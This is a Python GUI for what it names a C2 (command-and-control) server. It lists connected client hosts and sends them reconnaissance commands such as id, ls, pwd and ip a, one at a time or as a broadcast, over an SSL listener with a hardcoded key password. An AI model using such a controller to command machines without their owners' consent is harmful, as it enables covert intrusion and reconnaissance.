#//#!/usr/bin/env python3
#import socket
#import ssl
#import sys
#import threading
#from queue import Queue
from server import *
from time import sleep
import PySimpleGUI as sg


# Returns a list of all hostnames from all clients
def host_list():
    hosts=[]
    ls = Server().client_ls()
    for i in ls:
        hosts.append([i, ls[i][0]])
    return hosts

# Returns a list of all clients
def cl_list():
    hosts=[]
    ls = Server().client_ls()
    for i in ls:
        hosts.append([i, ls[i][1]])
    return hosts

# Sends a command to the client from the server and reads the received output
def run_command(msg, command, client, q_dest, q_msg, q_data):
    print(f"[LOG]: {msg}")
    q_dest.put(client)
    q_msg.put(command)
    sleep(0.1)
    print(f"[LOG]: Client returned:\n\n")
    Server().read_data(q_data)

def gui_layout():
    data=[['', '']]
    commands=['Run `id`', 'Run `ls`', 'Run `pwd`', 'Run `ip a`', 'Disconnect client']
    sg.theme("DarkGrey14")
    headings = ["Connection ID", "Hostname"]

    menu_def = [['Application', ['&Exit']],
                ['Help', ['&About']] ]

    right_click_menu_def = [[], ['Exit']]

    controll_col =  [[sg.Menu(menu_def, key='-MENU-')],
                [sg.Button('Start Server'), sg.Button('Stop Server'),],
                [sg.Button('Add new client')],
                [sg.Table(values=data,
                        select_mode=sg.TABLE_SELECT_MODE_BROWSE,
                        headings=headings,
                        background_color='black',
                        justification='right',
                        auto_size_columns=True,
                        num_rows=10,
                        enable_events=True,
                        key='-TABLE-')],
                [sg.Button('Refresh table')]]
    
    logging_col = [[sg.Text("Event log")], [sg.Output(size=(60,15), font='Courier 10')]]

    client_col = [[sg.Text("Select a client from the table or the broadcast option")],
                [sg.Listbox(values=[], key="-CLIENT-", size=(30, 6))],
                [sg.Combo(values=commands, default_value="Select command", enable_events=True, key="-COMMAND-")],
                [sg.Checkbox("Turn ON/OFF the broadcasting", enable_events=True, key="-BROADCAST-")]]

    main_layout = [[sg.Column(controll_col), sg.VSeperator(), sg.Column(logging_col), sg.VSeperator(), sg.Column(client_col)]]

    ssl_layout = [[sg.Text("Select new key and certificat!")],
                [sg.Button("New Key")],
                [sg.Button("New Certificate")],
                [sg.Text("Port Number:"), sg.Input(enable_events=True, default_text=9090, key='-PORT-')],
                [sg.Text("Password for key (leave empty if no password):"), sg.Input(password_char="*", enable_events=True, key='-PASS-')],
                [sg.Button('Submit and (Re)Start server')]]


    layout = [[sg.Text('C2', justification='center', size=(92, 1), font=("Helvetica", 16), relief=sg.RELIEF_RIDGE, k='-TEXT HEADING-', enable_events=True)]]
    layout += [[sg.TabGroup([[  sg.Tab('Controller tab', main_layout),
                                sg.Tab('Settings', ssl_layout)]], key='-TAB GROUP-')]]

    return sg.Window('C2', layout, right_click_menu=right_click_menu_def)

def gui(q_data, q_msg, q_dest):
    port=9090
    cert="./cert.pem"
    key="key.pem"
    paswd="bleh"

    server=""
    data = host_list()
    client = ""
    
    window = gui_layout()
    while True:
        event, values = window.read()

        # Exiting options
        if event in (None, 'Exit') or event == sg.WIN_CLOSED:
            if server != "":
                q_dest.put(server)
                q_msg.put("KILLSURV")
                server=""
            q_msg.put("EXIT")
            print("[LOG]: Quitting...")
            break

        # Shows an about page
        elif event == 'About':
            print("[LOG]: Clicked About!")
            sg.popup("""BLEH""")

        # Starts the server
        elif event == "Start Server":
            if server != "":
                print("[INFO]: Server is already running!")
            else:
                server = Server(port, cert, key, paswd).start()

        # Stops the server
        elif event == "Stop Server":
            if server != "":
                q_dest.put(server)
                q_msg.put("KILLSURV")
                server=""

        # Starts listenning for a new client
        elif event == "Add new client":
            if server != "":
                q_dest.put(server)
                q_msg.put("NEWCL")
            else: print("[INFO]: Server is not running!")

        # Refreshes the table in case of new connection, or disconnecting
        elif event == 'Refresh table':
            data = host_list()
            window.Element('-TABLE-').update(values=data)
            if client == "ALL":
                window.Element('-CLIENT-').update(values=[["Broadcast is ON"], ["Sending to all clients"]])
            else:
                window.Element('-CLIENT-').update(values=[])
                client = ""

        # Setting a target client as long as the broadcast is OFF
        elif event == "-TABLE-" and client != "ALL":
            data_selected = values[event]
            if len(data_selected) > 0:
                ds = data_selected[0]
                client = cl_list()
                client = client[ds]
                print(f"[LOG]: Host {data[ds][1]} selected")
                window.Element('-CLIENT-').update(values=[data[ds][1]])

        # Setting broadcast to ON/OFF
        elif event == "-BROADCAST-":
            if values[event] == True:
                client="ALL"
                window.Element('-CLIENT-').update(values=[["Broadcast is ON"], ["Sending to all clients"]])
            elif values[event] == False:
                client=""
                window.Element('-CLIENT-').update(values=[])

        # Running a selected command
        elif event == "-COMMAND-":
            if server != "":
                msg = values[event]
                if client != "":
                    if msg == 'Run `id`':
                        command = "ID"
                        run_command(msg, command, client, q_dest, q_msg, q_data)
                    elif msg == "Run `ls`":
                        command = "LS"
                        run_command(msg, command, client, q_dest, q_msg, q_data)
                    elif msg == "Run `pwd`":
                        command = "PWD"
                        run_command(msg, command, client, q_dest, q_msg, q_data)
                    elif msg == "Run `ip a`":
                        command = "IP"
                        run_command(msg, command, client, q_dest, q_msg, q_data)
                    elif msg == "Disconnect client":
                        command = "DISSCL"
                        run_command(msg, command, client, q_dest, q_msg, q_data)
                        client = ""

        # Selecting a new key
        elif event == "New Key":
            key = sg.popup_get_file('Choose new key')
            key = str(key)

        # Selecting a new certificate
        elif event == "New Certificate":
            cert = sg.popup_get_file('Choose new certificat')
            cert = str(cert)

        # (Re)Starts the server after new key, cert, port and password are given
        elif event == "Submit and (Re)Start server":
            print(f"[LOG]: New key: {key}\n")
            print(f"[LOG]: New cert: {cert}\n")
            port = int(values['-PORT-'])
            print(f"[LOG]: New port: {port}\n")
            paswd = str(values['-PASS-'])
            print(f"[LOG]: New pass: {print('*'*len(paswd))}")

            if server != "":
                q_dest.put(server)
                q_msg.put("KILLSURV")
            server = Server(port, cert, key, paswd).start()

    window.close()
    exit(0)

# Creates the required queues, starts an API thread and runs the GUI
def gui_main():
    q_data, q_msg, q_dest = Queue(), Queue(), Queue()
    API_thread = threading.Thread(target=Server().API, name="API", args=(q_msg, q_data, q_dest))
    API_thread.start()

    gui(q_data, q_msg, q_dest)


if __name__ == '__main__':
    gui_main()
    